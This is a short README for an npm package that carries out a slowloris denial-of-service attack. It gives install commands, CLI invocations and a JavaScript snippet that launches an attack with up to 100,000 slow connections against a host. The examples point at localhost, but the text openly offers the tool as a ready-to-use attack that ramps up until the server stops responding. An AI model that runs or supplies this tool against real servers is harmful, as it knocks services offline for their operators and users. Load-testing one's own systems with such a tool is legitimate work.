
### `Intro`
Example of slowloris attack it should start with a few connections and try and ramp up until I can't connected anymore

#### `Install`
``` bash
npm install --save git+https://git@github.com/anzerr/slowloris.tool.git
```

``` bash
git clone git+https://git@github.com/anzerr/slowloris.tool.git &&
cd slowloris.tool &&
npm link
```

### `Example`

``` bash
slowloris --host localhost:8080 --max 50000
slowloris --host https://localhost:8080
```

``` javascript
const Loris = require('slowloris.tool');
let l = new Loris('http://localhost:8080', 100000).attack();
return new Promise((resolve) => l.once('end', resolve)).then(() => {
	console.log('attack ended');
}).catch(console.log);
```